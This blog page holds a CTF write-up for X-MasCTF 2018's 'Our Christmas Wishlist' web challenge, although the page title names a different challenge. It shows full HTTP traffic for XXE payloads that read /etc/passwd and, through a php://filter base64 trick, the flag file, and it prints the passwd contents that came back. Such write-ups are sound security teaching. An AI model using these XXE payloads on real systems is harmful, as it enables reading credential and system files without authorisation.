<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     
    <title>gi0cann&#39;s notes  | X-MasCTF 2018 RE: Endless Christmas</title>
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">

    <meta name="viewport" content="width=device-width,minimum-scale=1">
     <meta name="generator" content="Hugo 0.53" />
      
      
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
      

     <link href='https://gi0cann.github.io/dist/main.css' rel='stylesheet' type="text/css" />

     

      <meta property="og:title" content="X-MasCTF 2018 RE: Endless Christmas" />
<meta property="og:description" content="X-MasCTF 2018 WEB Our Christmas Wishlist We are presented with a page with a textarea where you can input text.
We put hello in the textarea an submit the request:
We get the following response:
Taking a look at the request in burp we see the following request:
POST / HTTP/1.1 Host: 95.179.163.167:12001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://95." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://gi0cann.github.io/posts/x-masctf2018-our-christmas-wishlist/" /><meta property="article:published_time" content="2018-12-30T21:08:42-04:00"/>
<meta property="article:modified_time" content="2018-12-30T21:08:42-04:00"/>

<meta itemprop="name" content="X-MasCTF 2018 RE: Endless Christmas">
<meta itemprop="description" content="X-MasCTF 2018 WEB Our Christmas Wishlist We are presented with a page with a textarea where you can input text.
We put hello in the textarea an submit the request:
We get the following response:
Taking a look at the request in burp we see the following request:
POST / HTTP/1.1 Host: 95.179.163.167:12001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://95.">


<meta itemprop="datePublished" content="2018-12-30T21:08:42-04:00" />
<meta itemprop="dateModified" content="2018-12-30T21:08:42-04:00" />
<meta itemprop="wordCount" content="604">



<meta itemprop="keywords" content="web,burp suite,ctf,xxe,php," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="X-MasCTF 2018 RE: Endless Christmas"/>
<meta name="twitter:description" content="X-MasCTF 2018 WEB Our Christmas Wishlist We are presented with a page with a textarea where you can input text.
We put hello in the textarea an submit the request:
We get the following response:
Taking a look at the request in burp we see the following request:
POST / HTTP/1.1 Host: 95.179.163.167:12001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://95."/>

  </head>

  <body class="ma0 avenir bg-near-white">

    

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="https://gi0cann.github.io/" class="f3 fw2 hover-white no-underline white-90 dib">
      gi0cann&#39;s notes
    </a>
    <div class="flex-l items-center">
      
      







    </div>
  </div>
</nav>

    </div>
  </header>


    <main class="pb7" role="main">
      
  <div class="flex-l mt2 mw8 center">
    <article class="center cf pv5 ph3 ph4-ns mw7">
      <header>
        <p class="f6 b helvetica tracked">
          POSTS
        </p>
        <h1 class="f1">
          X-MasCTF 2018 RE: Endless Christmas
        </h1>
      </header>
      <div class="nested-copy-line-height lh-copy f4 nested-links nested-img mid-gray">
        

<h1 id="x-masctf-2018-web-our-christmas-wishlist">X-MasCTF 2018 WEB Our Christmas Wishlist</h1>

<p>We are presented with a page with a textarea where you can input text.</p>

<p><img src="wishlist-form-init.png" alt="initial-page" /></p>

<p>We put hello in the textarea an submit the request:</p>

<p><img src="wishlist-form-hello.png" alt="hello-submit" /></p>

<p>We get the following response:</p>

<p><img src="wishlist-form-hello-submit.png" alt="hello-response" /></p>

<p>Taking a look at the request in burp we see the following request:</p>

<pre><code>POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 24
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;message&gt;hello&lt;/message&gt;
</code></pre>

<p>with the following response:</p>

<pre><code>HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 22:38:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 16

Your wish: hello
</code></pre>

<p>Looking at the request we can see that our input is being sent as xml.</p>

<p>We proceed to sent some malformed xml to see how the xml parser will react:</p>

<pre><code>POST / HTTP/1.1
Host: 199.247.6.180:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 2
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;&lt;
</code></pre>

<p>Response:</p>

<pre><code>HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:19:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 811

&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : Extra content at the end of the document in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
Your wish: 
</code></pre>

<p>The error messages in the request shows us the file with the code is located at &lsquo;/var/www/html/index.php&rsquo; and that it&rsquo;s using simplexml.</p>

<p>We try check for XXE(XML External Entity) and by trying retrieve /etc/passwd with the following request:</p>

<pre><code>POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 125
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM 'file:///etc/passwd'&gt;]&gt;
&lt;message&gt;hello:&amp;internal;&lt;/message&gt;
</code></pre>

<p>And we get a reponse with the contents of the passwd file:</p>

<pre><code>HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 23:56:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 1359

Your wish: hello:root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin
</code></pre>

<p>Now that we know it&rsquo;s vulnerable to XXE all we have to do is find and display the flag.</p>

<p>We send to following request to read the file containing the flag as base64 to avoid problem character for the xml parser:</p>

<pre><code>POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 173
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/flag.txt'&gt;]&gt;
&lt;message&gt;&amp;internal;&lt;/message&gt;
</code></pre>

<p>Response:</p>

<pre><code>HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:28:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 99

Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=
</code></pre>

<p>base64 decoding &lsquo;WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=&rsquo; give us &lsquo;X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To<strong>Jo1n_7he_p4r7y</strong>700______}&rsquo; as the flag.</p>

      </div>
    </article>
    <aside class="ph3 mt2 mt6-ns">
      







  <div class="bg-light-gray pa3">
    <ul>
      <li class="list b mb3">
        1 More Posts
      </li>
      
        <li class="list f5 w-100 hover-bg-white nl1">
          
          <a href="/posts/x-masctf2018-endless-christmas/" class="link ph2 pv2 db black">
            X-MasCTF 2018 RE: Endless Christmas
          </a>
        </li>
      
        <li class="list f5 w-100 hover-bg-white nl1">
          
          <a href="/posts/x-masctf2018-our-christmas-wishlist/" class="link ph2 pv2 db black o-50">
            X-MasCTF 2018 RE: Endless Christmas
          </a>
        </li>
      
    </ul>
  </div>


    </aside>
  </div>

    </main>
    <footer class="bg-near-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://gi0cann.github.io/" >
    &copy; 2018 gi0cann&#39;s notes
  </a>
  







  </div>
</footer>

    <script src="https://gi0cann.github.io/dist/app.bundle.js" async></script>

  </body>
</html>
